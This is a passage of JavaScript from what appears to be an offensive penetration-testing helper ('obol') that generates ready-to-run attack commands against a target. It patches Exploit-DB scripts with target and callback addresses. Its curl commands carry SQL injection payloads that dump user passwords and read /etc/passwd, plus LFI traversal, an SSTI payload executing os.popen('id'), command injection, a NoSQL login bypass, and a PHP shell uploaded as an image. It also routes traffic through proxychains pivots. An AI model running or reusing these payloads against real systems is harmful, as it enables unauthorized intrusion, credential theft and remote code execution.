      for (var i = 0; i < cands.length; i++) {
        if (lowerMap[cands[i]]) return lowerMap[cands[i]];
      }
      return '';
    }
    var parts = [];
    var urlFlag = pick(['--url', '-u', '--target-url', '--base-url', '--uri']);
    var hostFlag = !urlFlag ? pick(['--rhost', '--target', '--host', '-t', '-h']) : '';
    var portFlag = hostFlag ? pick(['--rport', '--port', '-p']) : '';
    var lhostFlag = pick(['--lhost', '--lh', '--attacker', '--callback-ip', '--reverse-ip']);
    var lportFlag = pick(['--lport', '--lp', '--callback-port', '--reverse-port']);
    var userFlag = pick(['--username', '--user']);
    var passFlag = pick(['--password', '--pass']);

    if (urlFlag && (ctx.url || ctx.web_origin || ctx.target)) {
      parts.push(urlFlag + ' ' + (ctx.url || ctx.web_origin || ('http://' + ctx.target)));
    } else if (hostFlag && ctx.target) {
      parts.push(hostFlag + ' ' + ctx.target);
      if (portFlag && (ctx.web_port || ctx.port)) parts.push(portFlag + ' ' + (ctx.web_port || ctx.port));
    }
    if (userFlag && ctx.user) parts.push(userFlag + ' ' + shellQuote(ctx.user, 'bash'));
    if (passFlag && ctx.password) parts.push(passFlag + ' ' + shellQuote(ctx.password, 'bash'));
    if (lhostFlag && ctx.lhost) parts.push(lhostFlag + ' ' + ctx.lhost);
    if (lportFlag && ctx.lport) parts.push(lportFlag + ' ' + ctx.lport);
    return parts.length ? (' ' + parts.join(' ')) : '';
  }

  function _adaptEdbCommand(action, index, currentFilled, facts, ctx) {
    if (!action || action.id !== 'edb-run-adapted-exploit' || index !== 0 || !currentFilled) return null;
    var inspList = _factValsForTarget(facts, 'exploit.script_inspected', ctx && ctx.target);
    if (!inspList.length) return null;
    var insp = inspList[inspList.length - 1];
    for (var i = inspList.length - 1; i >= 0; i--) {
      if (ctx && ctx.edb_file && inspList[i].edb_file === ctx.edb_file) { insp = inspList[i]; break; }
    }
    if (!insp) return null;
    var origFile = insp.edb_file || (ctx && ctx.edb_file) || 'exploit.py';
    var lang = String(insp.lang || '').toLowerCase();
    var runner = (lang === 'ruby' || /\.rb$/i.test(origFile)) ? 'ruby'
      : (lang === 'perl' || /\.pl$/i.test(origFile)) ? 'perl'
      : (lang === 'php' || /\.php$/i.test(origFile)) ? 'php'
      : (lang === 'bash' || /\.sh$/i.test(origFile)) ? 'bash'
      : 'python3';
    var plan = insp.patch_plan || {};
    var hardcoded = Array.isArray(insp.hardcoded_constants) ? insp.hardcoded_constants : (Array.isArray(plan.hardcoded) ? plan.hardcoded : []);
    var cliFlags = Array.isArray(insp.cli_flags) ? insp.cli_flags : [];
    var maxArgv = Number(insp.sys_argv_count || 0);
    var needsConstPatch = plan.needs_const_patch !== undefined ? !!plan.needs_const_patch : (hardcoded.length > 0 && cliFlags.length === 0 && maxArgv === 0 && lang !== 'c' && lang !== 'cpp');
    var stripBurpProxy = plan.strip_burp_proxy !== undefined ? !!plan.strip_burp_proxy : (Array.isArray(insp.hazards) && insp.hazards.indexOf('burp_proxy') >= 0);

    if (needsConstPatch || stripBurpProxy) {
      var workFile = plan.working_copy || (/\.[A-Za-z0-9]+$/.test(origFile) ? origFile.replace(/(\.[A-Za-z0-9]+)$/, '_obol$1') : (origFile + '_obol'));
      var sedExprs = [];
      var summaryParts = [];
      var assignSep = (runner === 'bash') ? '=' : ' = ';
      if (needsConstPatch) {
        for (var hi = 0; hi < hardcoded.length; hi++) {
          var hc = hardcoded[hi];
          if (!hc || !hc.name) continue;
          var nk = hc.name.toLowerCase();
          var val = '';
          if (nk === 'url' || nk === 'target_url' || nk === 'base_url') {
            val = (ctx && (ctx.url || ctx.web_origin)) || ((ctx && ctx.target) ? ('http://' + ctx.target) : '');
          } else if (nk === 'target' || nk === 'target_ip' || nk === 'host' || nk === 'rhost' || nk === 'victim' || nk === 'victim_ip') {
            val = (ctx && ctx.target) || '';
          } else if (nk === 'rport') {
            val = String((ctx && (ctx.web_port || ctx.port)) || '80');
          } else if (nk === 'lhost' || nk === 'attacker' || nk === 'attacker_ip' || nk === 'srvhost') {
            val = (ctx && ctx.lhost) || '';
          } else if (nk === 'lport' || nk === 'srvport') {
            val = String((ctx && ctx.lport) || '4444');
          }
          if (!val || String(val).indexOf('{{') >= 0) continue;
          var lhsPat = (hc.dollar ? '\\\\\\$' : '') + _reEsc(hc.name);
          var lhsRep = (hc.dollar ? '\\$' : '') + hc.name;
          if (hc.numeric && /^\d+$/.test(String(val))) {
            sedExprs.push("s|^([[:space:]]*)" + lhsPat + "[[:space:]]*=[[:space:]]*(['\"][0-9]+['\"]|[0-9]+)|\\1" + lhsRep + assignSep + String(val) + "|");
          } else {
            var safeVal = String(val).replace(/\\/g, '\\\\').replace(/"/g, '\\"').replace(/&/g, '\\&').replace(/\|/g, '\\|');
            sedExprs.push("s|^([[:space:]]*)" + lhsPat + "[[:space:]]*=[[:space:]]*['\"][^'\"]*['\"]|\\1" + lhsRep + assignSep + "'" + safeVal + "'|");
          }
          summaryParts.push((hc.dollar ? '$' : '') + hc.name + '=' + val);
        }
      }
      if (stripBurpProxy) {
        sedExprs.push("s|^([[:space:]]*)proxies[[:space:]]*=[[:space:]]*\\{[^}]*\\}|\\1proxies = {}|g");
        sedExprs.push("s|,[[:space:]]*proxies[[:space:]]*=[[:space:]]*proxies\\b||g");
        summaryParts.push('proxies={}');
      }
      if (sedExprs.length) {
        var cliTail = (!needsConstPatch && cliFlags.length) ? _buildEdbCliArgs(cliFlags, ctx || {}) : '';
        return {
          filled: 'cp ' + origFile + ' ' + workFile + ' && sed -i -E "' + sedExprs.join('; ') + '" ' + workFile + ' && ' + runner + ' ' + workFile + cliTail,
          edbPatchSummary: 'Safe copy ' + workFile + ' auto-patched (' + summaryParts.join(', ') + '; ' + origFile + ' untouched)'
        };
      }
    }

    if (cliFlags.length) {
      var builtArgs = _buildEdbCliArgs(cliFlags, ctx || {});
      if (builtArgs) {
        return {
          filled: runner + ' ' + origFile + builtArgs,
          edbPatchSummary: ''
        };
      }
    } else if (maxArgv > 0 && ctx && ctx.target) {
      var posArgs = [ctx.url || ('http://' + ctx.target)];
      if (maxArgv >= 2 && ctx.lhost) posArgs.push(ctx.lhost);
      if (maxArgv >= 3 && ctx.lport) posArgs.push(String(ctx.lport));
      return {
        filled: runner + ' ' + origFile + ' ' + posArgs.join(' '),
        edbPatchSummary: ''
      };
    }
    return null;
  }

  function _selectWebSpec(actionId, facts, ctx, opts) {
    var tgt = ctx && ctx.target;
    var formFacts = _factValsForTarget(facts, 'web.forms_discovered', tgt);
    var reqFacts = _factValsForTarget(facts, 'web.http_request_captured', tgt);
    if (!formFacts.length && !reqFacts.length) return null;

    var allForms = [], allLinks = [], baseOrigin = '';
    formFacts.forEach(function (fv) {
      if (fv.baseOrigin && !baseOrigin) baseOrigin = fv.baseOrigin;
      if (Array.isArray(fv.forms)) fv.forms.forEach(function (fm) { allForms.push(fm); });
      if (Array.isArray(fv.links)) fv.links.forEach(function (lk) { allLinks.push(lk); });
    });
    var latestReq = reqFacts.length ? reqFacts[reqFacts.length - 1] : null;
    var origin = (latestReq && latestReq.origin) || baseOrigin || (ctx && ctx.web_origin) || ('http://' + ((ctx && ctx.target) || '127.0.0.1'));
    var cookieJar = ((ctx && ctx.lootdir) || 'loot') + '/cookies.txt';

    var selForm = null;
    if (allForms.length) {
      var wantedIdx = (opts && typeof opts.selectedFormIdx === 'number') ? opts.selectedFormIdx : -1;
      if (wantedIdx >= 0 && wantedIdx < allForms.length) {
        selForm = allForms[wantedIdx];
      } else if (actionId === 'file-upload') {
        for (var fi = 0; fi < allForms.length; fi++) {
          if (allForms[fi].hasFile || allForms[fi].isMultipart) { selForm = allForms[fi]; break; }
        }
      } else if (actionId === 'nosql-injection') {
        for (var ni = 0; ni < allForms.length; ni++) {
          if (/login|auth|signin/i.test(allForms[ni].action) || (allForms[ni].userFields || []).some(function (uf) { return uf.type === 'password'; })) {
            selForm = allForms[ni];
            break;
          }
        }
      }
      if (!selForm && !(actionId === 'file-upload' && latestReq && latestReq.boundary)) selForm = allForms[0];
    }

    return {
      origin: origin,
      cookieJar: cookieJar,
      form: selForm,
      forms: allForms,
      links: allLinks,
      req: latestReq
    };
  }

  function _pickParamName(fields, preferRe) {
    if (!Array.isArray(fields) || !fields.length) return '';
    if (preferRe) {
      for (var i = 0; i < fields.length; i++) {
        if (preferRe.test(fields[i].name)) return fields[i].name;
      }
    }
    return fields[0].name || '';
  }

  function _csrfFlags(csrfFields, mode) {
    if (!Array.isArray(csrfFields) || !csrfFields.length) return '';
    return csrfFields.map(function (cf) {
      var pair = cf.name + '=' + (cf.value || '');
      if (mode === 'multipart') return ' -F ' + shellQuote(pair, 'bash');
      return ' --data-urlencode ' + shellQuote(pair, 'bash');
    }).join('');
  }

  function _adaptWebExploitCommand(action, index, currentFilled, facts, ctx, opts) {
    if (!action || !currentFilled) return null;
    var aid = action.id;
    if (aid !== 'sqli-basics' && aid !== 'manual-sqli-exploitation' && aid !== 'lfi-probe' && aid !== 'file-upload' && aid !== 'ssti' && aid !== 'nosql-injection' && aid !== 'command-injection') {
      return null;
    }
    var spec = _selectWebSpec(aid, facts, ctx, opts);
    if (!spec) return null;
    var cookieFlags = (spec.req && spec.req.cookies && !spec.form)
      ? (' -H ' + shellQuote('Cookie: ' + spec.req.cookies, 'bash'))
      : (' -b ' + spec.cookieJar + ' -c ' + spec.cookieJar);

    if (aid === 'file-upload') {
      var upEndpoint = '';
      var fileField = '';
      var extraMultipart = '';
      if (spec.form && (spec.form.hasFile || spec.form.isMultipart)) {
        upEndpoint = spec.origin + spec.form.action;
        fileField = (spec.form.fileFields && spec.form.fileFields[0] && spec.form.fileFields[0].name) || 'file';
        extraMultipart = _csrfFlags(spec.form.csrfFields, 'multipart');
        (spec.form.userFields || []).forEach(function (uf) {
          if (uf.value) extraMultipart += ' -F ' + shellQuote(uf.name + '=' + uf.value, 'bash');
        });
      } else if (spec.req && spec.req.boundary) {
        var reqUpPath = spec.req.pathname || spec.req.path || '/';
        upEndpoint = spec.req.origin + reqUpPath;
        var mpFile = (spec.req.params || []).filter(function (p) { return p.loc === 'multipart' && p.filename !== undefined && p.filename !== ''; })[0];
        fileField = (mpFile && mpFile.name) || 'file';
        (spec.req.params || []).forEach(function (p) {
          if (p.loc === 'multipart' && (!mpFile || p.name !== mpFile.name) && p.value) {
            extraMultipart += ' -F ' + shellQuote(p.name + '=' + p.value, 'bash');
          }
        });
      }
      if (!upEndpoint) return null;
      if (index === 0) {
        return { filled: 'curl -skL' + cookieFlags + ' -F ' + shellQuote(fileField + '=@test.txt', 'bash') + extraMultipart + ' ' + shellQuote(upEndpoint, 'bash'), webTargetSummary: 'POST ' + upEndpoint + ' (' + fileField + ')' };
      }
      if (index === 1) {
        return { filled: 'curl -skL' + cookieFlags + ' -F ' + shellQuote(fileField + '=@shell.php;type=image/png', 'bash') + extraMultipart + ' ' + shellQuote(upEndpoint, 'bash'), webTargetSummary: 'POST ' + upEndpoint + ' (' + fileField + ')' };
      }
      return null;
    }

    if (aid === 'nosql-injection' && index === 0) {
      if (spec.form) {
        var uFields = spec.form.userFields || [];
        var userF = _pickParamName(uFields, /user|email|login|account|uid/i) || 'user';
        var passF = _pickParamName(uFields.filter(function (f) { return f.name !== userF; }), /pass|pwd|secret/i) || 'pass';
        var loginUrl = spec.origin + spec.form.action;
        var csrfBody = (spec.form.csrfFields || []).map(function (cf) { return encodeURIComponent(cf.name) + '=' + encodeURIComponent(cf.value || ''); }).join('&');
        var bodyStr = userF + '[$ne]=x&' + passF + '[$ne]=x' + (csrfBody ? ('&' + csrfBody) : '');
        return { filled: 'curl -skL -i' + cookieFlags + ' -X ' + spec.form.method + ' ' + shellQuote(loginUrl, 'bash') + ' -d ' + shellQuote(bodyStr, 'bash'), webTargetSummary: spec.form.method + ' ' + spec.form.action + ' (' + userF + ', ' + passF + ')' };
      }
      if (spec.req && spec.req.params && spec.req.params.length >= 2) {
        var reqPath = spec.req.pathname || spec.req.path || '/';
        var rLoginUrl = spec.req.origin + reqPath;
        var rU = spec.req.params[0].name, rP = spec.req.params[1].name;
        if (spec.req.params[0].loc === 'json') {
          var jPayload = '{"' + rU + '":{"$ne":null},"' + rP + '":{"$ne":null}}';
          return { filled: 'curl -skL -i' + cookieFlags + ' -X ' + spec.req.method + " -H 'Content-Type: application/json' " + shellQuote(rLoginUrl, 'bash') + ' -d ' + shellQuote(jPayload, 'bash'), webTargetSummary: spec.req.method + ' ' + reqPath + ' (JSON ' + rU + ', ' + rP + ')' };
        }
      }
      return null;
    }

    // Parameterized GET link / form / captured request adaptation for SQLi, LFI, SSTI, CMDi
    var preferMap = {
      'sqli-basics': /id|item|cat|prod|user|uid|num|order|sort|q|search|query/i,
      'manual-sqli-exploitation': /id|item|cat|prod|user|uid|num|order|sort|q|search|query/i,
      'lfi-probe': /page|file|path|view|include|inc|doc|template|tpl|lang|module|dir|read/i,
      'ssti': /name|user|template|tpl|title|msg|message|content|preview|text|q/i,
      'command-injection': /ip|host|ping|addr|target|cmd|exec|domain|url|file|dest/i
    };
    var prefRe = preferMap[aid];
    var method = 'GET', endpoint = '', paramName = '', baseVal = '1', extraFlags = '';

    if (aid === 'lfi-probe' && spec.links && spec.links.length) {
      var lfiLink = spec.links[0];
      for (var li = 0; li < spec.links.length; li++) {
        if (spec.links[li].params.some(function (p) { return prefRe.test(p.name); })) { lfiLink = spec.links[li]; break; }
      }
      method = 'GET';
      endpoint = spec.origin + lfiLink.pathname;
      paramName = _pickParamName(lfiLink.params, prefRe);
      var lpMatch = lfiLink.params.filter(function (p) { return p.name === paramName; })[0];
      baseVal = (lpMatch && lpMatch.value) || '1';
    } else if (spec.form && (spec.form.userFields || []).length) {
      method = spec.form.method || 'GET';
      endpoint = spec.origin + spec.form.action;
      paramName = _pickParamName(spec.form.userFields, prefRe);
      var ufMatch = spec.form.userFields.filter(function (f) { return f.name === paramName; })[0];
      baseVal = (ufMatch && ufMatch.value) || '1';
      extraFlags = _csrfFlags(spec.form.csrfFields, 'urlencoded');
      spec.form.userFields.forEach(function (uf) {
        if (uf.name !== paramName) extraFlags += ' --data-urlencode ' + shellQuote(uf.name + '=' + (uf.value || 'test'), 'bash');
      });
    } else if (spec.links && spec.links.length) {
      var bestLink = spec.links[0];
      for (var li2 = 0; li2 < spec.links.length; li2++) {
        if (spec.links[li2].params.some(function (p) { return prefRe && prefRe.test(p.name); })) { bestLink = spec.links[li2]; break; }
      }
      method = 'GET';
      endpoint = spec.origin + bestLink.pathname;
      paramName = _pickParamName(bestLink.params, prefRe);
      var bpMatch = bestLink.params.filter(function (p) { return p.name === paramName; })[0];
      baseVal = (bpMatch && bpMatch.value) || '1';
    } else if (spec.req && spec.req.params && spec.req.params.length) {
      var nonMp = spec.req.params.filter(function (p) { return p.loc === 'query' || p.loc === 'body'; });
      if (nonMp.length) {
        method = nonMp[0].loc === 'body' ? spec.req.method : 'GET';
        endpoint = spec.req.origin + (spec.req.pathname || spec.req.path || '/');
        paramName = _pickParamName(nonMp, prefRe);
        var rpMatch = nonMp.filter(function (p) { return p.name === paramName; })[0];
        baseVal = (rpMatch && rpMatch.value) || '1';
      }
    }

    if (!endpoint || !paramName) return null;
    var payload = '';
    if (aid === 'sqli-basics') {
      payload = index === 0 ? (baseVal + "'") : (index === 1 ? (baseVal + ' AND 1=1-- -') : (baseVal + ' UNION SELECT 1,2,3-- -'));
    } else if (aid === 'manual-sqli-exploitation') {
      var payloads = [
        baseVal + ' ORDER BY 5-- -',
        '0 UNION SELECT 1,2,3,4,5-- -',
        '0 UNION SELECT 1,@@version,database(),current_user(),5-- -',
        '0 UNION SELECT 1,group_concat(username,0x3a,password),3,4,5 FROM users-- -',
        baseVal + ' AND IF(SUBSTRING((SELECT password FROM users LIMIT 1),1,1)=0x61,SLEEP(3),0)-- -',
        '0 UNION SELECT 1,LOAD_FILE(0x2f6574632f706173737764),3,4,5-- -'
      ];
      payload = payloads[index] || payloads[0];
    } else if (aid === 'lfi-probe') {
      payload = index === 0 ? '../../../../etc/passwd' : (index === 1 ? '....//....//....//etc/passwd' : 'php://filter/convert.base64-encode/resource=index');
    } else if (aid === 'ssti') {
      payload = index === 0 ? '{{7*7}}' : (index === 1 ? '{{config}}' : "{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read()}}");
    } else if (aid === 'command-injection') {
      if (index === 0) payload = '127.0.0.1;id';
      else if (index === 2) payload = '127.0.0.1;cat${IFS}/etc/passwd';
      else return null;
    }

    if (!payload) return null;
    var verbFlags = method === 'GET' ? ' -G' : (' -X ' + method);
    var cmdOut = 'curl -skL' + cookieFlags + verbFlags + ' ' + shellQuote(endpoint, 'bash') + ' --data-urlencode ' + shellQuote(paramName + '=' + payload, 'bash') + extraFlags;
    return {
      filled: cmdOut,
      webTargetSummary: method + ' ' + endpoint.replace(/^https?:\/\/[^\/]+/, '') + ' (' + paramName + ')'
    };
  }

  function _hasActiveSocksOnlyPivot(facts, targetIp, opts) {
    if (opts && opts.viaSocks === false) return false;
    if (opts && opts.viaSocks === true) return true;
    if (!facts) return false;
    var pivVals = _factValsForTarget(facts, 'tunnel.reachable_via_pivot', targetIp);
    for (var i = 0; i < pivVals.length; i++) {
      var pv = pivVals[i];
      if (!pv || pv.active === false) continue;
      if (pv.tunnelKind === 'route') return false;
      if (pv.tunnelKind === 'socks') return true;
      if (/\b(?:ligolo|sshuttle)\b/i.test(String(pv.via || ''))) return false;
      if (/\b(?:chisel|socks|ssh-dynamic)\b|ssh\s+-D/i.test(String(pv.via || ''))) return true;
    }
    return false;
  }

  function _proxychainsPrefix(arsenalProf) {
    var prof = arsenalProf !== undefined ? arsenalProf : _arsenalProfile();
    if (prof && prof.proxychains_tor_default) {
      return 'proxychains4 -q -f ~/.obol/proxychains.conf ';
    }
    return 'proxychains4 -q ';
  }

  function _wrapSegmentForSocks(seg, arsenalProf) {
    var s = String(seg || '').trim();
    if (!s || /^proxychains4?\b/i.test(s) || _LOCAL_OR_LISTENER_CMD_RE.test(s)) return null;
    var envPrefix = '';
    var envM = /^((?:[A-Za-z_][A-Za-z0-9_]*=(?:"[^"]*"|'[^']*'|[^\s"']+)\s+)+)([\s\S]+)$/.exec(s);
    var rest = s;
    if (envM) {
      envPrefix = envM[1];
      rest = envM[2];
    }
    if (/^proxychains4?\b/i.test(rest) || _LOCAL_OR_LISTENER_CMD_RE.test(rest)) return null;
    var pcPref = _proxychainsPrefix(arsenalProf);
    if (/^(?:sudo\s+)?nmap\b/i.test(rest) && !/\s-sU\b/.test(rest)) {
      var nm = rest.replace(/^sudo\s+/i, '');
      if (/\s-sS\b/.test(nm)) nm = nm.replace(/\s-sS\b/g, ' -sT');
      else if (!/\s-sT\b/.test(nm) && !/\s-sn\b/.test(nm)) nm = nm.replace(/^nmap\b/i, 'nmap -sT');
      if (!/\s-Pn\b/.test(nm)) nm = nm.replace(/^nmap\b/i, 'nmap -Pn');
      if (!/\s-n\b/.test(nm)) nm = nm.replace(/^nmap\b/i, 'nmap -n');
      return envPrefix + pcPref + nm;
    }
    if (/^sudo\s+/i.test(rest)) {
      return envPrefix + rest.replace(/^sudo\s+/i, 'sudo ' + pcPref);
    }
    return envPrefix + pcPref + rest;
  }

  function _applySocksWrapping(cmdStr, arsenalProf) {
    var s = String(cmdStr || '').trim();
    if (!s || /\bproxychains4?\b/i.test(s)) return null;
    if (s.indexOf(' && ') >= 0) {
      var parts = s.split(' && ');
      var anyWrapped = false;
      var mapped = parts.map(function (pt) {
        var w = _wrapSegmentForSocks(pt, arsenalProf);
        if (w) { anyWrapped = true; return w; }
        return pt;
      });
      return anyWrapped ? mapped.join(' && ') : null;
    }
    return _wrapSegmentForSocks(s, arsenalProf);
  }

  // Fill a command variant of an action (0-based). Returns {tool, run, note, filled, webNote}.
  // obol is the hands-on edition: where an action carries a web-suited command (`web` on a
  // variant, or `web_command` on the action) - one tuned for a human who must copy/paste or attach
  // the output by hand, not a terminal reading it off disk - that form is preferred here. A
  // `web_note` carries the matching hands-on guidance (e.g. "large output -> tee to a file and
  // attach it in Evidence"). Neither field exists in obol's mined data; both are additive.
  function fillCommand(action, facts, opts, index) {
    opts = opts || {};
    if (action && action.resolvedContext) {
      facts = action.resolvedContext.facts;
      opts = Object.assign({}, opts, {params:action.resolvedContext.params,target:action.resolvedContext.target});
    }
    index = index || 0;
    var commands = (action.commands && action.commands.length) ? action.commands : [{ run: action.command, tool: action.tool }];
    if (index < 0 || index >= commands.length) index = 0;
    var c = commands[index] || {};
    var run = c.web || c.run || action.web_command || action.command || '';
    var errors = [], defaultedTokens = [], defaultValues = {};
    var effLocus = opts.locus || (OBOL.pack && OBOL.pack.commandExecutionLocus ? OBOL.pack.commandExecutionLocus(c, action) : (c.locus === 'onhost' ? 'onhost' : 'remote'));
    var fillOpts = Object.assign({}, opts, { action: action, command: run, locus: effLocus, shell: c.shell || opts.shell || inferShell(run), errors: errors, _defaultedTokens: defaultedTokens, _defaultValues: defaultValues });
    if (!fillOpts.context && facts && facts.forAction) fillOpts.context = facts.forAction(action, c)._resolvedContext;
    var frameCache = (fillOpts.context && fillOpts.context._frame && !opts.extra && !opts.arsenal && !opts.unwrapSocks && opts.viaSocks === undefined && !opts.errors)
      ? (fillOpts.context._frame.filledCmds || (fillOpts.context._frame.filledCmds = Object.create(null)))
      : null;
    var frameCacheKey = frameCache
      ? ((action && action.id) || '') + '\x00' + run + '\x00' + index + '\x00' + (fillOpts.context.attemptKey || '') + '\x00' + effLocus + '\x00' + ((opts.workspace && opts.workspace.root) || '')
      : '';
    if (frameCache && frameCache[frameCacheKey]) return frameCache[frameCacheKey];
    var ctx = buildContext(facts, fillOpts);
    fillOpts._prebuiltCtx = ctx;
    var filled = fillTemplate(run, facts, fillOpts);
    var actForArsenal = (c.tool && action && c.tool !== action.tool) ? Object.assign({}, action, { cmdTool: c.tool }) : action;
    var finalFilled = errors.length ? '' : applyArsenal(filled, actForArsenal, opts.arsenal);
    var fillTmpl = defaultedTokens.length
      ? applyArsenal(fillTemplate(run, facts, Object.assign({}, fillOpts, { _keepDefaultedAsToken: true, _defaultedTokens: null, _defaultValues: null, errors: [] })), actForArsenal, opts.arsenal)
      : finalFilled;
    var edbPatchSummary = '';
    var webTargetSummary = '';

    if (finalFilled && !errors.length) {
      var edbAdapted = _adaptEdbCommand(action, index, finalFilled, facts, ctx);
      if (edbAdapted && edbAdapted.filled) {
        finalFilled = applyArsenal(edbAdapted.filled, actForArsenal, opts.arsenal);
        edbPatchSummary = edbAdapted.edbPatchSummary || '';
      }
      var webAdapted = _adaptWebExploitCommand(action, index, finalFilled, facts, ctx, opts);
      if (webAdapted && webAdapted.filled) {
        finalFilled = applyArsenal(webAdapted.filled, actForArsenal, opts.arsenal);
        webTargetSummary = webAdapted.webTargetSummary || '';
      }
    }

    var socksAvailable = false;
    var socksWrapped = false;
    var unwrappedFilled = finalFilled;
    var wrappedFilled = finalFilled;
    if (finalFilled && !errors.length && effLocus !== 'onhost' && _hasActiveSocksOnlyPivot(facts, ctx && ctx.target, opts)) {
      var candidateWrap = _applySocksWrapping(finalFilled, opts.arsenal);
      if (candidateWrap && candidateWrap !== finalFilled) {
        socksAvailable = true;
        wrappedFilled = candidateWrap;
        if (!opts.unwrapSocks) {
          finalFilled = wrappedFilled;
          socksWrapped = true;
        }
      }
    }

    var resObj = {
      tool: c.tool || action.tool || '',
      locus: effLocus,
      alt: !!c.alt,
      note: c.note || '',
      webNote: c.web_note || action.web_note || '',
      win: !!c.win,   // a box-ending move - the coach flags it "PWN THIS TARGET"
      run: run,
      // thread the action so the loot glue can resolve {{userlist}}/{{hashfile}} for THIS move, then
      // rewrite to the operator's synced box (invocation + wordlist paths) - a no-op until they sync.
      filled: finalFilled,
      fillTmpl: fillTmpl,
      defaultedTokens: defaultedTokens,
      defaultValues: defaultValues,
      unwrappedFilled: unwrappedFilled,
      wrappedFilled: wrappedFilled,
      socksAvailable: socksAvailable,
      socksWrapped: socksWrapped,
      edbPatchSummary: edbPatchSummary,
      webTargetSummary: webTargetSummary,
      blocked: errors.length > 0, errors: errors,
    };
    if (frameCache && frameCacheKey) frameCache[frameCacheKey] = resObj;
    return resObj;
  }

  // All variants of an action, filled - for the coach to show "many commands".
  function fillAll(action, facts, opts) {
    var commands = (action.commands && action.commands.length) ? action.commands : [{ run: action.command, tool: action.tool }];
    return commands.map(function (c, i) { return fillCommand(action, facts, opts, i); });
  }

  // The distinctive ACTION tokens of a command - the verbs/subcommands that say WHAT it does, with the
  // tool name, flags, param values (target/domain/user/secret/…), paths, numbers and shell scaffolding
  // stripped out. Two commands with the same action tokens are "the same move" regardless of which host or
  // credential filled them, so this is how obol tells that a suggested command is one you already ran.
  // Long flags that only say WHERE/HOW to connect, not what the move does - dropped so `--host`/`--dc-ip`
  // don't drown out the real action, and so a run with `--detail` matches one without it.
  var _PLUMBING_FLAGS = { host: 1, 'dc-ip': 1, 'dc-host': 1, dns: 1, domain: 1, port: 1, timeout: 1, detail: 1,
    json: 1, threads: 1, jitter: 1, nameserver: 1, 'no-pass': 1, gc: 1, 'min-rate': 1 };
  // Bare words that are shell scaffolding or output plumbing, never an action.
  var _NOISE_WORDS = { 'for': 1, 'in': 1, 'do': 1, 'done': 1, 'then': 1, 'fi': 1, 'else': 1, 'echo': 1,
    'sudo': 1, 'while': 1, 'tee': 1, 'cat': 1 };
  // Short flags that DEFINE the action and must be kept - `-x`/`-X` (execute a command) is the whole
  // difference between `nxc smb …` (validate the credential) and `nxc smb … -x '<cmd>'` (run a command),
  // so dropping it made running the validator wrongly mark the exec command as already run.
  var _ACTION_SHORT_FLAGS = { x: 1 };
  function _actionSig(cmd, params) {
    // Process the WHOLE pipeline (do NOT stop at the first pipe): the transform after a `|` - awk / grep /
    // sort in a HANDOFF - is exactly what distinguishes `nxc … --users | tee` from `… | awk | grep | sort`,
    // so two commands that share a prefix but differ downstream must NOT collapse to the same signature.
    var toks = String(cmd || '').trim().split(/\s+/);
    var vals = {};
    ['target', 'domain', 'username', 'user', 'password', 'nthash', 'lhost', 'lport', 'rhost'].forEach(function (k) {
      var v = params && params[k]; if (v) vals[String(v).toLowerCase()] = 1;
    });
    var out = {};
    // Include the leading tool token too (i=0): the tool IS distinctive - `certipy find` and
    // `sccmhunter find` share the `find` subcommand but are NOT the same move, so dropping the tool made
    // one wrongly match the other. Shell keywords (`for`/`while`/`sudo`) fall out via the noise filter.
    for (var i = 0; i < toks.length; i++) {
      var raw = toks[i];
      if (/^(?:\||\|\||&&|;|>|>>|<)$/.test(raw)) continue;        // shell operators
      var t = raw.replace(/^["']+|["']+$/g, '');                  // strip surrounding quotes
      if (!t || t.indexOf('{{') >= 0) continue;                   // empty, or an unfilled template value slot

      if (t.charAt(0) === '-') {
        if (t.charAt(1) === '-' && t.length > 3) {                // long flag: keep action ones (--users), drop plumbing
          var lf = t.replace(/^--/, '').toLowerCase();
          if (!vals[lf] && !_PLUMBING_FLAGS[lf]) out[lf] = 1;
        } else {                                                  // short flag: drop plumbing (-u/-p/-d), keep action (-x)
          var sf = t.replace(/^-+/, '').toLowerCase();
          if (_ACTION_SHORT_FLAGS[sf]) out[sf] = 1;
        }
        continue;
      }
      var lt = t.toLowerCase();
      if (vals[lt] || _NOISE_WORDS[lt]) continue;                 // param value or shell/plumbing word
      if (/^\d+$/.test(t) || /^\d{1,3}(?:\.\d{1,3}){3}$/.test(t)) continue; // number or IP
      if (/[\/@\\=]/.test(t) || t.indexOf('$') >= 0) continue;    // path/email/kv or shell var ($g)
      if (lt.length < 2) continue;
      out[lt] = 1;
    }
    return out;
  }
  var _actSigCache = typeof WeakMap !== 'undefined' ? new WeakMap() : null;
  function _paramsSigKey(params) {
    if (!params) return '';
    return [
      params.target || '', params.domain || '', params.username || '', params.user || '',
      params.password || '', params.nthash || '', params.lhost || '', params.lport || '', params.rhost || ''
    ].join('\x00').toLowerCase();
  }
  function _actMatchesTarget(act, tgt) {
    if (!tgt || !act) return true;
    var actTgt = act.target || (/^host:/.test(act.scope || '') ? act.scope.slice(5) : '');
    if (!actTgt || actTgt === tgt) return true;
    var cmdStr = String(act.command || act.dispatch || '');
    if (cmdStr.indexOf(tgt) >= 0) return true;
    return false;
  }
  function _activitySigs(activities, params, target) {
    if (!Array.isArray(activities) || !activities.length) return [];
    var pKey = _paramsSigKey(params) + '\x00' + String(target || '').toLowerCase();
    var hit = _actSigCache ? _actSigCache.get(activities) : null;
    if (hit && hit.pKey === pKey && hit.refs.length === activities.length) {
      var same = true;
      for (var c = 0; c < activities.length; c++) {
        var cur = activities[c] || {};
        if (hit.refs[c] !== activities[c] || hit.cmds[c] !== (cur.command || '') || hit.disps[c] !== (cur.dispatch || '')) {
          same = false;
          break;
        }
      }
      if (same) return hit.sigs;
    }
    var sigs = [], refs = new Array(activities.length), cmds = new Array(activities.length), disps = new Array(activities.length);
    for (var a = 0; a < activities.length; a++) {
      var act = activities[a] || {};
      refs[a] = activities[a];
      cmds[a] = act.command || '';
      disps[a] = act.dispatch || '';
      if (target && !_actMatchesTarget(act, target)) continue;
      // Match the honest command OR the recovered dispatch label, an ATTACHED dump has no typed command,
      // so obol's recovered routing signature is the only record of what actually ran.
      if (act.command) sigs.push(_actionSig(act.command, params));
      if (act.dispatch && act.dispatch !== act.command) sigs.push(_actionSig(act.dispatch, params));
      if (Array.isArray(act.sequenceCommands)) {
        for (var s = 0; s < act.sequenceCommands.length; s++) {
          if (act.sequenceCommands[s]) sigs.push(_actionSig(act.sequenceCommands[s], params));
        }
      }
    }
    if (_actSigCache) {
      _actSigCache.set(activities, { pKey: pKey, refs: refs, cmds: cmds, disps: disps, sigs: sigs });
    }
    return sigs;
  }

